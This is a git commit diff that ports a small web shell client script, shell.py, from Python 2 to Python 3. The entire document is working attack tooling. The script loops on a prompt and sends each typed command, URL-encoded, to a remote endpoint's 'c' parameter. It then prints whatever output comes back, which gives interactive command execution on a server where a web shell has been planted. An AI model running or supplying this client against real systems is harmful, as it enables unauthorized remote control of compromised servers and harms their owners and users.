cd0fd3575fd8d74c97ea3d13f0b344da3ab79450
Rahul Zhade <rzhade3@users.noreply.github.com>
2022-11-08 20:25:32 +0000

    Update webshell to support Python3

--- shell.py
+++ shell.py
@@ -1,15 +1,14 @@
 import sys
-import urllib
-import urllib2
+import urllib.parse, urllib.request
 
 endpoint = sys.argv[1]
 
 while True:
-    line = raw_input("$ ")
+    line = input("$ ")
     line = line.strip()
     if line == "quit" or line == "exit":
         sys.exit(0)
-    encline = urllib.quote(line, safe='')
-    response = urllib2.urlopen(endpoint + "?c=" + encline)
+    encline = urllib.parse.quote(line, safe='')
+    response = urllib.request.urlopen(endpoint + "?c=" + encline)
     data = response.read()
-    print data
+    print(data.decode('ascii'))
